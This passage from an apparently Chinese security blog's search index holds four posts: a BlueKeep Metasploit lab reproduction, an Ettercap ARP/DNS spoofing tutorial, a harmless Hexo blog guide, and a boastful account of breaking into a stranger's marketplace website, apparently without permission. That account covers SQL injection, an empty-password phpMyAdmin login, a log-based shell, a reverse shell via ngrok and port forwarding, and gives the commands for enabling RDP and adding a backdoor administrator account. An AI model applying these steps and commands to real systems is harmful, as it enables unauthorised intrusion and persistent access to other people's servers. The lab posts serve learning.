src="../../../../img/19-9-10/7.jpg" alt="Assassins小白"></p><p>发现还搜不到 <code>cve_2019_0708_bluekeep_rce</code> 模块</p><p>输入命令 <code>reload_all </code> 重新加载一下利用模块，再搜索</p><p><img src="../../../../img/19-9-10/8.jpg" alt="Assassins小白"></p><p>然后使用命令：<code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce </code> 加载模块</p><p><strong>需要设置三处</strong></p><p><img src="../../../../img/19-9-10/11.jpg" alt="Assassins小白"></p><p><code>set RHOSTS 受害机IP</code> 设置受害机IP </p><p><code>set RPORT 受害机PORT</code> 设置受害机RDP端口号 </p><p><code>set target ID数字(可选为0-4)</code> 设置受害机机器架构</p><p>1 是物理机 </p><p>2 是virtubox </p><p>3 是vmware</p><p>4 是hyper</p><p>这里我们使用的是VMware,那么target 3满足条件，设置 <code>set target 3</code></p><p>使用<code>exploit</code>开始攻击,等待建立连接 </p><h2 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h2><p>攻击kali：192.168.10.167</p><p><img src="../../../../img/19-9-10/9.jpg" alt="Assassins小白"></p><p>靶机win7：192.168.10.224</p><p><img src="../../../../img/19-9-10/10.jpg" alt="Assassins小白"></p><p><code>set RHOSTS 192.168.10.224</code></p><p>受害机RDP端口号一般为默认3389</p><p><code>set target 3</code></p><p><code>exploit</code>  </p><p><strong>PS</strong>：win7版本7601 x64，开启远程访问，关闭防火墙，保持网络通畅</p><h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>哦豁，蓝屏</p><p><img src="../../../../img/19-9-10/12.jpg" alt="Assassins小白"></p><p>前前后后执行了十几次exp，还没弹回来过shell</p><p><img src="../../../../img/19-9-10/13.jpg" alt="Assassins小白"></p><p>这个exp目前只有windwos 7/2008r2  而且是社区阉割版极易蓝屏</p><p>对2008 R2进行测试的话还需要修改注册表 <code>[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\rdp-tcp\fDisableCam]</code> 值修改为0(系统默认为1） </p><p>但是我都能修改注册表了，还要你0708干什么</p><h2 id="复现成功"><a href="#复现成功" class="headerlink" title="复现成功"></a>复现成功</h2><p>咦，是不是听见我说它不好，写文章的时候再试了几次，居然成功了</p><p>(之前我的虚拟机配置是单核4G，我修改成2核2G之后，试了两三次就成功了，而且未获取到会话不会蓝屏了)</p><p><img src="../../../../img/19-9-10/14.jpg" alt="Assassins小白"></p><p>system权限</p><p><img src="../../../../img/19-9-10/15.jpg" alt="Assassins小白"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="http://weishi.360.cn/mianyigongju.html">http://weishi.360.cn/mianyigongju.html</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE-2019-0708 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ettercap局域网DNS欺骗</title>
      <link href="2019/09/03/Ettercap%E5%B1%80%E5%9F%9F%E7%BD%91DNS%E6%AC%BA%E9%AA%97/"/>
      <url>2019/09/03/Ettercap%E5%B1%80%E5%9F%9F%E7%BD%91DNS%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<p>花时间去解释不如花时间去证明 </p><hr><span id="more"></span><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>打开Ettercap的DNS文件进行编辑，在kali Linux 2.0的文件路径为 <code>/etc/ettercap/etter.dns</code></p><p>编辑文件: <code>leafpad /etc/ettercap/etter.dns</code></p><p><img src="https://i.loli.net/2019/09/03/JsoSHahNOt9E2cM.png" alt="Assassins小白"></p><p>* 代表所有域名，后边就是你要欺骗他们访问的地址，这里我写的是kali虚拟机的IP，然后保存</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>再来编辑<code>/var/www/html/index.html</code>文件  改成你自定义页面 这里我简单的改了下</p><p><img src="https://i.loli.net/2019/09/03/uYR6WErx4To7pJl.png" alt="Assassins小白"></p><p>因为后面我们要启动apache服务，也就是网页服务器，这是主页文件，说白了目的是当DNS欺骗成功后，受害者访问网站后，打开的页面就是我们这里的这个主页文件里边的内容</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>现在我们在到终端输入命令<code>service apache2 start</code>来启动apache服务器 (把本机作为一个服务器) </p><p><img src="https://i.loli.net/2019/09/03/AjdCbUQWFZgmDhR.png" alt="iAssassins小白"></p><p>访问虚拟机kali的IP看看</p><p><img src="https://i.loli.net/2019/09/03/WwK49Fm6GlCqRuf.png" alt="Assassins小白"></p><p>显示我们的主页，说明apache服务器已经开启了</p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>输入命令<code>ettercap -G</code>来进入ettercap的图形界面 </p><p><img src="https://i.loli.net/2019/09/03/XYnSCKpsuJFLgN2.png" alt="Assassins小白"></p><p><code>Sniff</code> —&gt; <code>Unified sniffing</code></p><p><img src="https://i.loli.net/2019/09/03/5bhgsBCoL7GiWmf.png" alt="Assassins小白"></p><p>选择你的网卡 确定</p><p><img src="https://i.loli.net/2019/09/03/STsdAzwHjiL5oPY.png" alt="Assassins小白"></p><p>扫描局域网下在线的主机</p><p><code>Hosts</code> —&gt; <code>Scan for hosts</code></p><p><img src="https://i.loli.net/2019/09/03/qCX7VMg23ecRKhE.png" alt="Assassins小白"></p><p><img src="https://i.loli.net/2019/09/03/CoGycVrhT8RbKIk.png" alt="Assassins小白"></p><p>扫描完，然后选择 <code>Hosts list</code> 查看存活列表</p><p><img src="https://i.loli.net/2019/09/03/WOl3M87jgca1zwq.png" alt="Assassins小白"></p><p>我们的物理机IP是 <code>192.168.10.180</code> 我们就拿我们物理机做实验,欺骗我们物理机</p><p><img src="https://i.loli.net/2019/09/03/a3Db7AwJ1vPXEjc.png" alt="Assassins小白"></p><p>我们把网关 <code>192.168.10.1</code> 添加到Target 1</p><p>把要欺骗的IP添加到Targer 2</p><p><img src="https://i.loli.net/2019/09/03/q5RLTbmgA2GkrIz.png" alt="Assassins小白"></p><p>然后点击 <code>Mitm</code> —&gt; <code>ARP poisoning</code></p><p><img src="https://i.loli.net/2019/09/03/BIfRGpOFxNCWXAS.png" alt="Assassins小白"></p><p>第一个打勾，然后确定</p><p><img src="https://i.loli.net/2019/09/03/HKOR2QpoYZezcJ1.png" alt="Assassins小白"></p><p>再点击 <code>Plugins</code> —&gt; <code>Manage the plugins</code></p><p><img src="https://i.loli.net/2019/09/03/ofJ6PSIQn2Zpy5L.png" alt="Assassins小白"></p><p>配置插件  我们要进行的是DNS欺骗 双击<code>dns_spoof</code></p><p><img src="https://i.loli.net/2019/09/03/ipJqKUVGf2om3a5.png" alt="Assassins小白"></p><p>然后点击 <code>Start</code> —&gt; <code>Start sniffing</code>  </p><p>开始DNS欺骗 这样就开始工作了 </p><p><img src="https://i.loli.net/2019/09/03/SIx3iYlRtLW2Dsw.png" alt="Assassins小白"></p><p>然后我们物理机访问任何网站都会被解析到192.168.10.167(虚拟机kali)这个地址</p><p><img src="https://i.loli.net/2019/09/03/9koFJhUHL2G8BP3.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Ettercat </tag>
            
            <tag> DNS欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次常规渗透</title>
      <link href="2019/08/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F/"/>
      <url>2019/08/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>我谁都不怕，就怕自己不够强大 </p><hr><span id="more"></span><p><img src="../../../../img/19-8-28/1.jpg" alt="Assassins小白"></p><p>QQ空间发现别人用PHP自己写了一个二手市场的网站</p><p>然后我闲的无聊，就有了本次渗透</p><p>测了一下，输入单引号</p><p><img src="../../../../img/19-8-28/2.jpg" alt="Assassins小白"></p><p>MySQL数据库直接报错</p><p><img src="../../../../img/19-8-28/3.jpg" alt="Assassins小白"></p><p>给师傅看了一下，确实是存在注入的</p><p><img src="../../../../img/19-8-28/4.jpg" alt="Assassins小白"></p><p>然后师傅干活去了，叫我自己整</p><p>但是我拉网线，也没有时间，就只能下班回去看吧</p><p>下班回去之后发现网站打不开了</p><p><img src="../../../../img/19-8-28/7.jpg" alt="Assassins小白"></p><p>然后..</p><p><img src="../../../../img/19-8-28/5.jpg" alt="Assassins小白"></p><p>继续。</p><p>抓个POST包，然后丢sqlmap里面跑</p><p><img src="../../../../img/19-8-28/6.jpg" alt="Assassins小白"></p><p>sql报错看到网站路径是在wamp文件夹下面的，网站应该存在phpmyadmin</p><p>然后sqlmap跑mysql表下面的user列，但是在user列里面没有找到password字段</p><p>完了我就把user列里面的数据全部dump</p><p><img src="../../../../img/19-8-28/8.jpg" alt="Assassins小白"></p><p>发现NULL</p><p>然后就直接用户名：root  密码空 登陆phpmyadmin</p><p><img src="../../../../img/19-8-28/9.jpg" alt="Assassins小白"></p><p>然后利用日志拿到shell  –&gt; <a href="https://www.cnblogs.com/xishaonian/p/6622818.html">https://www.cnblogs.com/xishaonian/p/6622818.html</a> </p><p><img src="../../../../img/19-8-28/10.jpg" alt="Assassins小白"></p><p>虚拟终端执行whoami，直接是system权限 （一般用集成环境软件搭建的权限都比较大）</p><p><img src="../../../../img/19-8-28/11.jpg" alt="Assassins小白"></p><p>看一下ipconfig，是内网</p><p><img src="../../../../img/19-8-28/12.jpg" alt="Assassins小白"></p><p>然后本来想用Proxifier+reGeorg内网穿透搞这个内网的，但是我电脑没有环境</p><p>然后久哥哥教我用kali里面内嵌的portfwd工具进行端口转发</p><p>现在kali里面配置好ngrok，反弹shell过来</p><p><img src="../../../../img/19-8-28/14.jpg" alt="Assassins小白"></p><p><img src="../../../../img/19-8-28/13.jpg" alt="Assassins小白"></p><p>然后msf上面配置</p><p><img src="../../../../img/19-8-28/15.jpg" alt="Assassins小白"></p><p><img src="../../../../img/19-8-28/16.jpg" alt="Assassins小白"></p><p>然后反弹过来，msf上线</p><p><img src="../../../../img/19-8-28/17.jpg" alt="Assassins小白"></p><p>再使用portfwd端口转发 –&gt;  <a href="https://blog.csdn.net/ws13129/article/details/94395905?utm_source=app">https://blog.csdn.net/ws13129/article/details/94395905?utm_source=app</a> </p><p>-r 填目标内网IP</p><p><img src="../../../../img/19-8-28/18.jpg" alt="Assassins小白"></p><p>然后我们连接kali的33333端口就是连接的目标站的3389端口</p><p>连接试试</p><p><img src="../../../../img/19-8-28/19.jpg" alt="Assassins小白"></p><p>提示内部错误。。</p><p>久哥说是不是没开3389啊，然后我看了一下，，好像确实没开</p><p>使用cmd开启3389  –&gt;  <a href="https://www.cnblogs.com/dsli/p/7452535.html">https://www.cnblogs.com/dsli/p/7452535.html</a> </p><p>开启：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><p>然后我们再连接</p><p><img src="../../../../img/19-8-28/20.jpg" alt="Assassins小白"></p><p>OK，成功</p><p>然后我们再添加一个账号进去</p><p>net user xb xb123.a /add         添加一个用户为xb，密码为xb123.a<br>net localgroup administrators xb /add      把用户xb提升到administrators管理员组</p><p>登陆服务器</p><p><img src="../../../../img/19-8-28/21.jpg" alt="Assassins小白"></p><p>感谢久哥，感谢师傅，感谢NU1l</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github+Hexo搭建静态博客</title>
      <link href="2019/08/05/Github-Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/"/>
      <url>2019/08/05/Github-Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>水不撩不知深浅，人不拼怎知输赢 </p><hr><span id="more"></span><p>先安装下面两个软件</p><p>Node.js：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p><p>Git：<a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p><p>接下来安装hexo，使用npm安装hexo</p><p>安装命令：npm install -g hexo-cli</p><p><img src="../../../../img/19-8-5/1.png" alt="Assassins小白"></p><p>安装完了验证一下是否成功</p><p>命令：hexo -v</p><p><img src="../../../../img/19-8-5/2.png" alt="Assassins小白"></p><p>ok 安装完成</p><p>接下来我们先用hexo进行本地建站</p><p>先初始化Blog网站框架</p><p>在本地电脑上建立一个Blog目录，并在shell中进行下面命令，初始化框架:</p><p>hexo init &lt;文件夹&gt;        //博客文件夹名称</p><p><img src="../../../../img/19-8-5/3.png" alt="Assassins小白"></p><p>cd &lt;文件夹&gt;               //进入博客文件夹目录 </p><p><img src="../../../../img/19-8-5/4.png" alt="Assassins小白"></p><p>npm install</p><p><img src="../../../../img/19-8-5/5.png" alt="Assassins小白"></p><p>或者直接进入Blog目录中，执行hexo init和npm install  (blog目录自己先建好)</p><p>都是一样的，不习惯命令的话就用第二种。</p><p>_config.yml:</p><p>整个站点的配置信息：可以配置网站的title、author、language、目录、文章、日期、分页、扩展（主题名称、部署）信息，这个文件是博客配置文件，改错了会导致网站不正常</p><p><img src="../../../../img/19-8-5/6.png" alt="Assassins小白"></p><p>source: 资源文件夹,存放用户资源，这个是博客文章源码所存放的地方</p><p>themes: 主题文件夹，Hexo会根据此来生成静态页面，默认是官方的landscape主题</p><p>先在本地站点调试好，也就是说在所谓的测试环境测试好，再部署到给生产环境（Github）</p><p>写Blog文章</p><p>执行下面的命令创建一篇新的文章:</p><p>hexo new &lt;文章名&gt;</p><p><img src="../../../../img/19-8-5/7.png" alt="Assassins小白"></p><p>生成的文章在source/_posts文件夹下面 </p><p><img src="../../../../img/19-8-5/8.png" alt="Assassins小白"></p><p>可以看到文章已经生成好了</p><p>命令：</p><p>$ hexo generate  简写：hexo g </p><p>生成静态文件</p><p><img src="../../../../img/19-8-5/9.png" alt="Assassins小白"></p><p>$ hexo server    简写：hexo s </p><p><img src="../../../../img/19-8-5/10.png" alt="Assassins小白"></p><p>启动服务器，默认情况下，访问网址为： <a href="http://localhost:4000/">http://localhost:4000</a> </p><p><img src="../../../../img/19-8-5/11.png" alt="Assassins小白"></p><p>ok这就是本地搭建成功的效果，不过这是默认主题，可以根据需要改主题</p><p>接下来讲GitHub，先注册GitHub账号，这个我就不说了。</p><p>设置GitHub SSH Key</p><p>本地设置git邮箱、用户名和密码</p><p><code>git config --global user.email &quot;你注册GitHub的邮箱&quot;</code></p><p><code>git config --global user.name  &quot;你的GitHub用户名&quot;</code></p><p>本地创建SSH Key</p><p><code>ssh-keygen -t rsa -C &quot;邮箱地址”</code></p><p><img src="../../../../img/19-8-5/12.png" alt="Assassins小白"></p><p>首先打开用户根目录（用户根目录一般为为C:\Users\username）查看是否已经有了SSH Key的文件夹.ssh </p><p><img src="../../../../img/19-8-5/13.png" alt="Assassins小白"></p><p>ssh  可能隐藏了，所以需要打开隐藏的文件</p><p>添加生成的SSH Key到GitHub账户</p><p>打开在当前用户的根目录下生成的.ssh文件里面的ssh.pub（ssh 公钥）,拷贝其内容到[SSH and GPG keys -&gt; SSH Keys -&gt; Add SSH Key]</p><p><img src="../../../../img/19-8-5/14.png" alt="Assassins小白"></p><p><img src="../../../../img/19-8-5/15.png" alt="Assassins小白"></p><p>验证下SSH是否设置成功</p><p>ssh -T <a href="mailto:&#103;&#105;&#x74;&#64;&#103;&#105;&#x74;&#104;&#x75;&#x62;&#46;&#99;&#x6f;&#109;">&#103;&#105;&#x74;&#64;&#103;&#105;&#x74;&#104;&#x75;&#x62;&#46;&#99;&#x6f;&#109;</a></p><p>第一次提示不能连接，直接输入yes即可</p><p><img src="../../../../img/19-8-5/16.png" alt="Assassins小白"></p><p>GitHub部署</p><p>建立GitHub Pages之后，即可以将本地搭建的Hexo网站部署到GitHub上去</p><p>创建存储库，名字就写你GitHub名字+Github.io</p><p><img src="../../../../img/19-8-5/17.png" alt="Assassins小白"></p><p>如下</p><p><img src="../../../../img/19-8-5/18.png" alt="Assassins小白"></p><p>命令都敲一遍</p><p><img src="../../../../img/19-8-5/19.png" alt="Assassins小白"></p><p>这就好了 </p><p><img src="../../../../img/19-8-5/20.png" alt="Assassins小白"></p><p>然后修改一下站点_config.yml配置文件</p><p>repo: <a href="https://github.com/username/username.github.io.git%EF%BC%88%E4%BD%A0%E7%9A%84GitHub%E9%A1%B5%E9%9D%A2%E4%BB%93%E5%BA%93%E5%9C%B0%E5%9D%80%EF%BC%89">https://github.com/username/username.github.io.git（你的GitHub页面仓库地址）</a></p><p>branch: master</p><p><img src="../../../../img/19-8-5/21.png" alt="Assassins小白"></p><p>博客文件夹目录执行命令</p><p>Hexo g -d</p><p><img src="../../../../img/19-8-5/22.png" alt="Assassins小白"></p><p>报错，输入命令</p><p>npm install –save hexo-deployer-git</p><p><img src="../../../../img/19-8-5/23.png" alt="Assassins小白"></p><p>输入命令Hexo g -d部署到GitHub o:p&gt;</p><p><img src="../../../../img/19-8-5/24.png" alt="Assassins小白"></p><p><img src="../../../../img/19-8-5/25.png" alt="Assassins小白"></p><p>访问域名(<a href="https://你的github名字.github.io/">https://你的GitHub名字.github.io</a>)</p><p><img src="../../../../img/19-8-5/26.png" alt="Assassins小白"></p><p>模板太丑了，换个模板</p><p>Hexo博客根目录打开Shell终端，输入下面命令</p><p>git clone <a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a> themes/next</p><p><img src="../../../../img/19-8-5/27.png" alt="Assassins小白"></p><p><img src="../../../../img/19-8-5/28.png" alt="Assassins小白"></p><p>下载完成，设置配置文件</p><p><img src="../../../../img/19-8-5/29.png" alt="Assassins小白"></p><p>这里改下模板的名字</p><p>Hexo s  本地搭建看一下效果</p><p><img src="../../../../img/19-8-5/30.png" alt="Assassins小白"></p><p>这个模板看起来还是很难看，换一个样式</p><p>进入模板配置文件</p><p><img src="../../../../img/19-8-5/31.png" alt="Assassins小白"></p><p>设置改动一下</p><p><img src="../../../../img/19-8-5/32.png" alt="Assassins小白"></p><p><img src="../../../../img/19-8-5/33.png" alt="Assassins小白"></p><p>再看看效果</p><p><img src="../../../../img/19-8-5/34.png" alt="Assassins小白"></p><p>这样看着就比较舒服</p><p>现在使用命令Hexo g -d部署到GitHub上面去</p><p><img src="../../../../img/19-8-5/35.png" alt="Assassins小白"></p><p>以后写文章直接输入以下命令</p><p>hexo new “文章名字”</p><p>hexo g -d</p><p><img src="../../../../img/19-8-5/36.png" alt="Assassins小白"></p><p>下面底部这里改成我们自定义的文字</p><p>进入文件夹 themes\next\layout_partials，编辑footer.swig文件</p><p><img src="../../../../img/19-8-5/37.png" alt="Assassins小白"></p><p>修改一下这两处，再看一下效果 </p><p><img src="../../../../img/19-8-5/38.png" alt="Assassins小白"></p><p>设置友情链接</p><p>访问themes\next下面的_config.yml ，找关键字Blog rolls</p><p><img src="../../../../img/19-8-5/39.png" alt="Assassins小白"></p><p>设置好后效果如下</p><p><img src="../../../../img/19-8-5/40.png" alt="Assassins小白"></p><p>设置头像</p><p>打开文件夹themes\next下的_config.yml文件</p><p>搜索关键字Sidebar Avatar</p><p>如下图设置</p><p><img src="../../../../img/19-8-5/41.png" alt="Assassins小白"></p><p>查看效果</p><p><img src="../../../../img/19-8-5/42.png" alt="Assassins小白"></p><p>使用&lt;!—more–&gt;隔开</p><p><img src="../../../../img/19-8-5/43.png" alt="Assassins小白"></p><p>网站效果</p><p><img src="../../../../img/19-8-5/44.png" alt="Assassins小白"></p><p><img src="../../../../img/19-8-5/45.png" alt="Assassins小白"></p><p>博客里面如果需要引用图片</p><p>可以使用图床，比如 <a href="https://sm.ms/">https://sm.ms/</a> ，调用图片网络地址</p><p><img src="../../../../img/19-8-5/46.png" alt="Assassins小白"></p><p>或者在public文件夹下面新建一个img文件夹，图片就上传到这个文件夹 </p><p><img src="../../../../img/19-8-5/47.png" alt="Assassins小白"></p><p>然后使用相对路径调用</p><p>../../../../img/xxx.jpg</p><p><img src="../../../../img/19-8-5/48.png" alt="Assassins小白"></p><p>效果图： </p><p><img src="../../../../img/19-8-5/49.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Github </tag>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
